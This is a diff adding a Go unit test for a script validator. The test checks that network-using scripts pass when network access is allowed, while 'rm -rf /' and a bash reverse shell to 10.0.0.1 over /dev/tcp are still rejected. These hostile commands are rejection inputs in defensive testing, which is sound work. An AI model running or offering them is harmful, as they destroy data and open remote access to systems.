@@ -149,6 +149,28 @@ func TestScriptValidator_ValidateScript(t *testing.T) {
 	}
 }
 
+// TestScriptValidator_AllowNetworkOptsOutOfStaticCheck verifies that a
+// workspace which opted into network access (allowNetwork=true) may run
+// scripts that use network libraries, while the dangerous-command and
+// reverse-shell checks still fire.
+func TestScriptValidator_AllowNetworkOptsOutOfStaticCheck(t *testing.T) {
+	v := NewScriptValidator(true)
+
+	networkScript := "import requests\nresp = requests.get('https://example.com')\nprint(resp.status_code)"
+	if result := v.ValidateScript(networkScript); !result.Valid {
+		t.Fatalf("network-using script must pass when allowNetwork=true, got errors: %v", result.Errors)
+	}
+
+	// Dangerous commands and reverse shells must still be rejected even with
+	// the network check opted out.
+	if result := v.ValidateScript("rm -rf /"); result.Valid {
+		t.Fatal("dangerous command must still be rejected when allowNetwork=true")
+	}
+	if result := v.ValidateScript("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"); result.Valid {
+		t.Fatal("reverse shell must still be rejected when allowNetwork=true")
+	}
+}
+
 func TestScriptValidator_ValidateArgs(t *testing.T) {
 	v := NewScriptValidator(false)
 
